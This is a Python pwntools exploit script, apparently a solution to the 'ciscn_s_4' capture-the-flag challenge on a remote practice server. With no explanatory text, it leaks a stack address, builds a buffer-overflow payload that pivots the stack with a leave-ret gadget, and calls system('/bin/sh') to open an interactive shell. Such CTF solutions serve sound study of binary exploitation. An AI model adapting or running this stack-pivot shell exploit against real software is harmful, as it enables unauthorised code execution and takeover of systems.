#coding:utf-8
from pwn import *
import pwnlib
from LibcSearcher import *
context.log_level = 'debug'
# sh = process("./ciscn_s_4")
sh = remote("node3.buuoj.cn",27872)
elf = ELF("./ciscn_s_4")
system_addr = elf.plt['system']
leave_ret = 0x08048562
payload = 'a' * 40
sh.recvuntil("Welcome, my friend. What's your name?")
sh.send(payload)
stack_addr = u32(sh.recvuntil("\xff")[-4:])
log.info("success leak stack_addr:0x%x"%stack_addr)
s_addr = stack_addr - 0x38
payload = p32(system_addr) + p32(0x80485FF) +p32(s_addr + 12) + "/bin/sh\x00"
payload = payload.ljust(0x28,"a")
payload += p32(s_addr-4) + p32(leave_ret)
# gdb.attach(sh)
# pause()
sh.sendline(payload)
sh.interactive()
